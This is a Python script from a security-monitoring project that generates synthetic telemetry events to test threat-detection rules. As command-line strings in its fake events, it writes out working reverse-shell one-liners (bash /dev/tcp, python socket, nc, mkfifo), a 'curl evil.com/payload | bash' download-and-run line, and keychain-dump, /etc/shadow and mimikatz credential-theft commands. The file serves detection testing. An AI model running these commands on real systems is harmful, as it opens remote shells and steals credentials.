#!/usr/bin/env python3
# filepath: /Users/athanneeru/Downloads/GitHub/Amoskys/scripts/rig/generate_events.py
"""Event Generator — Create realistic telemetry event streams for testing.

Produces TelemetryEventView objects matching real agent probe output.
Used by soak tests, injection scripts, and detection accuracy tests.

Usage:
    # As a library
    from scripts.rig.generate_events import EventGenerator
    gen = EventGenerator(device_id="test-host")
    events = gen.ssh_brute_force(attempts=5, src_ip="203.0.113.42")

    # CLI — dump events as JSON
    python scripts/rig/generate_events.py --scenario ssh_brute_force --count 5
    python scripts/rig/generate_events.py --scenario benign_session --duration-minutes 10
    python scripts/rig/generate_events.py --list-scenarios
"""

import argparse
import json
import sys
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from amoskys.intel.models import TelemetryEventView


class EventGenerator:
    """Deterministic event stream generator for all AMOSKYS scenarios.

    Each method returns a list of TelemetryEventView objects that
    faithfully represent what the real agent probes would produce.
    """

    def __init__(self, device_id: str = "test-host-001"):
        self.device_id = device_id
        self._seq = 0

    def _next_id(self) -> str:
        self._seq += 1
        return f"evt-{self._seq:06d}-{uuid.uuid4().hex[:8]}"

    def _ts(self, offset_seconds: float = 0.0) -> datetime:
        return datetime.now() - timedelta(seconds=offset_seconds)

    # ── SSH Brute Force (SC-06, SC-07) ────────────────────────────

    def ssh_brute_force(
        self,
        attempts: int = 5,
        src_ip: str = "203.0.113.42",
        target_users: Optional[List[str]] = None,
        interval_seconds: float = 2.0,
        success_on_last: bool = False,
    ) -> List[TelemetryEventView]:
        """Generate SSH brute force attack sequence.

        Uses field values matching FusionEngine rule_ssh_brute_force:
          - event_type="SECURITY", event_action="SSH"
          - event_outcome="FAILURE" for fails, "SUCCESS" for success

        Args:
            attempts: Number of SSH attempts (last one succeeds if success_on_last)
            src_ip: Attacker source IP
            target_users: Usernames tried (cycles through list)
            interval_seconds: Time between attempts
            success_on_last: If True, last attempt succeeds (compromise)
        """
        users = target_users or ["root", "admin", "ubuntu", "deploy"]
        events = []
        base_offset = attempts * interval_seconds

        for i in range(attempts):
            offset = base_offset - (i * interval_seconds)
            user = users[i % len(users)]
            is_success = success_on_last and i == attempts - 1
            outcome = "SUCCESS" if is_success else "FAILURE"

            events.append(
                TelemetryEventView(
                    event_id=self._next_id(),
                    device_id=self.device_id,
                    event_type="SECURITY",
                    severity="HIGH" if is_success else "MEDIUM",
                    timestamp=self._ts(offset),
                    attributes={
                        "probe": "ssh_brute_force",
                        "event_type": "protocol_threat",
                    },
                    security_event={
                        "event_category": "AUTHENTICATION",
                        "event_action": "SSH",
                        "event_outcome": outcome,
                        "user_name": user,
                        "source_ip": src_ip,
                        "risk_score": 0.3 if is_success else 0.6,
                        "mitre_techniques": ["T1110", "T1021.004"],
                        "requires_investigation": True,
                    },
                )
            )
        return events

    # ── Persistence After Auth (SC-08) ────────────────────────────

    def persistence_after_auth(
        self,
        src_ip: str = "203.0.113.42",
        username: str = "admin",
        plist_path: str = "/Users/attacker/Library/LaunchAgents/com.evil.agent.plist",
    ) -> List[TelemetryEventView]:
        """Generate SSH login followed by persistence installation.

        Uses field values matching FusionEngine rule_persistence_after_auth:
          - SSH event: event_action="SSH", event_outcome="SUCCESS"
          - Audit event: action_performed="CREATED", object_type="LAUNCH_AGENT"
          - file_path in attributes for user-directory detection
        """
        events = []

        # Event 1: Successful SSH login
        events.append(
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="SECURITY",
                severity="HIGH",
                timestamp=self._ts(300),  # 5 minutes ago
                attributes={
                    "probe": "ssh_brute_force",
                    "event_type": "protocol_threat",
                },
                security_event={
                    "event_category": "AUTHENTICATION",
                    "event_action": "SSH",
                    "event_outcome": "SUCCESS",
                    "user_name": username,
                    "source_ip": src_ip,
                    "risk_score": 0.3,
                    "mitre_techniques": ["T1021.004"],
                    "requires_investigation": False,
                },
            )
        )

        # Event 2: Persistence mechanism installed (within 10 min of auth)
        events.append(
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="AUDIT",
                severity="HIGH",
                timestamp=self._ts(120),  # 2 minutes ago (3 min after SSH)
                attributes={
                    "probe": "persistence_detector",
                    "event_type": "persistence_threat",
                    "file_path": plist_path,
                },
                audit_event={
                    "audit_category": "CHANGE",
                    "action_performed": "CREATED",
                    "object_type": "LAUNCH_AGENT",
                    "object_id": plist_path,
                    "before_value": "",
                    "after_value": "com.evil.agent",
                },
            )
        )

        return events

    # ── Reverse Shell (SC-09) ─────────────────────────────────────

    def reverse_shell(
        self,
        method: str = "bash_dev_tcp",
        attacker_ip: str = "198.51.100.10",
        attacker_port: int = 4444,
    ) -> List[TelemetryEventView]:
        """Generate reverse shell execution event."""
        cmd_map = {
            "bash_dev_tcp": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "python": f'python3 -c \'import socket,subprocess;s=socket.socket();s.connect(("{attacker_ip}",{attacker_port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
            "nc": f"nc -e /bin/sh {attacker_ip} {attacker_port}",
            "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f",
        }

        return [
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="PROCESS",
                severity="CRITICAL",
                timestamp=self._ts(0),
                attributes={
                    "probe": "reverse_shell_detector",
                    "event_type": "process_threat",
                    "command": cmd_map.get(method, cmd_map["bash_dev_tcp"]),
                },
                process_event={
                    "process_name": method.split("_")[0],
                    "pid": 31337,
                    "ppid": 1,
                    "uid": 0,
                    "command_line": cmd_map.get(method, cmd_map["bash_dev_tcp"]),
                    "executable_path": f"/usr/bin/{method.split('_')[0]}",
                },
            )
        ]

    # ── C2 Beaconing (SC-10) ─────────────────────────────────────

    def c2_beaconing(
        self,
        beacon_count: int = 10,
        interval_seconds: float = 60.0,
        c2_ip: str = "198.51.100.99",
        c2_port: int = 443,
    ) -> List[TelemetryEventView]:
        """Generate C2 beaconing pattern — periodic outbound connections."""
        events = []
        base_offset = beacon_count * interval_seconds

        for i in range(beacon_count):
            offset = base_offset - (i * interval_seconds)
            events.append(
                TelemetryEventView(
                    event_id=self._next_id(),
                    device_id=self.device_id,
                    event_type="FLOW",
                    severity="MEDIUM",
                    timestamp=self._ts(offset),
                    attributes={
                        "probe": "c2_beacon_detector",
                        "event_type": "network_threat",
                        "beacon_interval": str(interval_seconds),
                    },
                    flow_event={
                        "src_ip": "10.0.0.50",
                        "src_port": 49000 + i,
                        "dst_ip": c2_ip,
                        "dst_port": c2_port,
                        "protocol": "TCP",
                        "bytes_sent": 256,
                        "bytes_received": 128,
                    },
                )
            )
        return events

    # ── Data Exfiltration (SC-11) ─────────────────────────────────

    def data_exfiltration(
        self,
        dst_ip: str = "198.51.100.200",
        bytes_sent: int = 50_000_000,
    ) -> List[TelemetryEventView]:
        """Generate large outbound transfer event (data exfil)."""
        return [
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="FLOW",
                severity="HIGH",
                timestamp=self._ts(0),
                attributes={
                    "probe": "data_exfil_detector",
                    "event_type": "exfiltration_threat",
                    "bytes_sent": str(bytes_sent),
                },
                flow_event={
                    "src_ip": "10.0.0.50",
                    "src_port": 55000,
                    "dst_ip": dst_ip,
                    "dst_port": 443,
                    "protocol": "TCP",
                    "bytes_sent": bytes_sent,
                    "bytes_received": 1024,
                },
            )
        ]

    # ── LOLBin Abuse (SC-12) ─────────────────────────────────────

    def lolbin_abuse(
        self,
        binary: str = "osascript",
        command: str = "osascript -e 'do shell script \"curl http://evil.com/payload | bash\"'",
    ) -> List[TelemetryEventView]:
        """Generate living-off-the-land binary abuse event."""
        return [
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="PROCESS",
                severity="HIGH",
                timestamp=self._ts(0),
                attributes={
                    "probe": "lolbin_detector",
                    "event_type": "process_threat",
                    "binary": binary,
                },
                process_event={
                    "process_name": binary,
                    "pid": 12345,
                    "ppid": 1,
                    "uid": 501,
                    "command_line": command,
                    "executable_path": f"/usr/bin/{binary}",
                },
            )
        ]

    # ── Benign Baselines (SC-01 through SC-05) ───────────────────

    def benign_development_session(
        self,
        duration_minutes: int = 5,
    ) -> List[TelemetryEventView]:
        """Generate normal developer workstation activity — zero alerts expected.

        Produces metric-only events (agent_metrics) with no security events.
        """
        events = []
        cycles = max(1, duration_minutes * 2)  # 30s collection interval

        for i in range(cycles):
            offset = (cycles - i) * 30
            events.append(
                TelemetryEventView(
                    event_id=self._next_id(),
                    device_id=self.device_id,
                    event_type="METRIC",
                    severity="INFO",
                    timestamp=self._ts(offset),
                    attributes={
                        "probe": "agent_metrics",
                        "event_type": "agent_metrics",
                        "loops_started": str(i + 1),
                        "loops_succeeded": str(i + 1),
                        "events_emitted": "0",
                    },
                )
            )
        return events

    def benign_ssh_to_known_host(self) -> List[TelemetryEventView]:
        """Single SSH key-based auth to known server — zero alerts expected."""
        return [
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="SECURITY",
                severity="INFO",
                timestamp=self._ts(0),
                attributes={
                    "probe": "ssh_monitor",
                    "event_type": "protocol_threat",
                },
                security_event={
                    "event_category": "AUTHENTICATION",
                    "event_action": "SSH",
                    "event_outcome": "SUCCESS",
                    "user_name": "ubuntu",
                    "source_ip": "10.0.0.50",
                    "risk_score": 0.05,
                    "mitre_techniques": [],
                    "requires_investigation": False,
                },
            )
        ]

    # ── Credential Theft (SC-15) ─────────────────────────────────

    def credential_access(
        self,
        technique: str = "keychain_dump",
    ) -> List[TelemetryEventView]:
        """Generate credential access attempt."""
        cmd_map = {
            "keychain_dump": "security dump-keychain -d ~/Library/Keychains/login.keychain-db",
            "shadow_read": "cat /etc/shadow",
            "mimikatz": "sekurlsa::logonpasswords",
        }
        return [
            TelemetryEventView(
                event_id=self._next_id(),
                device_id=self.device_id,
                event_type="SECURITY",
                severity="CRITICAL",
                timestamp=self._ts(0),
                attributes={
                    "probe": "credential_detector",
                    "event_type": "credential_threat",
                    "technique": technique,
                },
                security_event={
                    "event_category": "CREDENTIAL_ACCESS",
                    "event_action": "DETECTED",
                    "event_outcome": "attempted",
                    "user_name": "attacker",
                    "source_ip": "10.0.0.50",
                    "risk_score": 0.95,
                    "mitre_techniques": ["T1555", "T1003"],
                    "requires_investigation": True,
                },
            )
        ]

    # ── Composite Attack Chain (SC-20) ───────────────────────────

    def full_attack_chain(
        self,
        src_ip: str = "203.0.113.42",
    ) -> List[TelemetryEventView]:
        """Generate full APT kill chain: recon → access → persist → exfil.

        Returns events across multiple MITRE stages.
        """
        events = []
        events.extend(
            self.ssh_brute_force(attempts=5, src_ip=src_ip, success_on_last=True)
        )
        events.extend(self.persistence_after_auth(src_ip=src_ip))
        events.extend(self.credential_access())
        events.extend(self.c2_beaconing(beacon_count=3, c2_ip=src_ip))
        events.extend(self.data_exfiltration())
        return events


# ── Scenario Registry ────────────────────────────────────────────

SCENARIOS = {
    "ssh_brute_force": {
        "desc": "5 failed SSH logins from single IP — no success (T1110, no incident)",
        "fn": lambda g: g.ssh_brute_force(),
        "expected_incidents": 0,  # Rule requires failures + success
    },
    "ssh_brute_force_with_success": {
        "desc": "SSH brute force ending in successful login (T1110 + T1021.004)",
        "fn": lambda g: g.ssh_brute_force(success_on_last=True),
        "expected_incidents": 1,
    },
    "persistence_after_auth": {
        "desc": "SSH login → LaunchDaemon install (T1021.004 + T1543.004)",
        "fn": lambda g: g.persistence_after_auth(),
        "expected_incidents": 1,
    },
    "reverse_shell": {
        "desc": "Reverse shell via bash /dev/tcp (T1059.004)",
        "fn": lambda g: g.reverse_shell(),
        "expected_incidents": 0,  # No fusion rule for standalone reverse shell yet
    },
    "c2_beaconing": {
        "desc": "10 periodic outbound connections at 60s intervals (T1071)",
        "fn": lambda g: g.c2_beaconing(),
        "expected_incidents": 0,  # C2 detection is probe-level, not fusion rule
    },
    "data_exfiltration": {
        "desc": "50 MB outbound transfer to external IP (T1048)",
        "fn": lambda g: g.data_exfiltration(),
        "expected_incidents": 0,
    },
    "lolbin_abuse": {
        "desc": "osascript running curl | bash (T1059.002)",
        "fn": lambda g: g.lolbin_abuse(),
        "expected_incidents": 0,
    },
    "full_attack_chain": {
        "desc": "Complete APT: brute force → persist → cred access → C2 → exfil",
        "fn": lambda g: g.full_attack_chain(),
        "expected_incidents": 2,  # ssh_brute_force + persistence_after_auth
    },
    "benign_session": {
        "desc": "Normal developer workstation activity — 0 alerts expected",
        "fn": lambda g: g.benign_development_session(),
        "expected_incidents": 0,
    },
    "benign_ssh": {
        "desc": "Single SSH key auth to known host — 0 alerts expected",
        "fn": lambda g: g.benign_ssh_to_known_host(),
        "expected_incidents": 0,
    },
    "credential_access": {
        "desc": "Keychain dump attempt (T1555)",
        "fn": lambda g: g.credential_access(),
        "expected_incidents": 0,
    },
}


def _event_to_dict(ev: TelemetryEventView) -> dict:
    """Serialize TelemetryEventView for JSON output."""
    d = {
        "event_id": ev.event_id,
        "device_id": ev.device_id,
        "event_type": ev.event_type,
        "severity": ev.severity,
        "timestamp": ev.timestamp.isoformat(),
        "attributes": ev.attributes,
    }
    if ev.security_event:
        d["security_event"] = ev.security_event
    if ev.audit_event:
        d["audit_event"] = ev.audit_event
    if ev.process_event:
        d["process_event"] = ev.process_event
    if ev.flow_event:
        d["flow_event"] = ev.flow_event
    return d


def main():
    parser = argparse.ArgumentParser(description="AMOSKYS Event Generator")
    parser.add_argument("--scenario", type=str, help="Scenario name")
    parser.add_argument(
        "--list-scenarios", action="store_true", help="List all scenarios"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of events for parameterized scenarios",
    )
    parser.add_argument(
        "--device-id", type=str, default="test-host-001", help="Device ID"
    )
    parser.add_argument(
        "--output", type=str, default="-", help="Output file (- for stdout)"
    )
    args = parser.parse_args()

    if args.list_scenarios:
        print("Available scenarios:")
        for name, info in SCENARIOS.items():
            print(f"  {name:35s} {info['desc']}")
            print(f"  {'':35s} Expected incidents: {info['expected_incidents']}")
        return

    if not args.scenario:
        parser.error("--scenario is required (use --list-scenarios to see options)")

    if args.scenario not in SCENARIOS:
        parser.error(f"Unknown scenario: {args.scenario}. Use --list-scenarios.")

    gen = EventGenerator(device_id=args.device_id)
    events = SCENARIOS[args.scenario]["fn"](gen)

    output = [_event_to_dict(e) for e in events]

    if args.output == "-":
        json.dump(output, sys.stdout, indent=2, default=str)
        print()
    else:
        with open(args.output, "w") as f:
            json.dump(output, f, indent=2, default=str)
        print(f"Wrote {len(output)} events to {args.output}")


if __name__ == "__main__":
    main()
